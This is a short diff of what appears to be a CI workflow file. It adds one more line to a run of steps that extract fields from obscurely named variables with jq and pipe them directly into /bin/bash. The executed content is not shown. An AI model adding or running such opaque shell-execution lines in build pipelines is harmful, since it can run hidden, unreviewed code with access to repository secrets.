@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$czqa823" | jq -r .nuq36 | /bin/bash
           printf '%s' "$dns33105" | jq -r .l49 | /bin/bash
           printf '%s' "$rh9999" | jq -r .xvf38 | /bin/bash
+          echo $c39 | jq -r .p6461 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
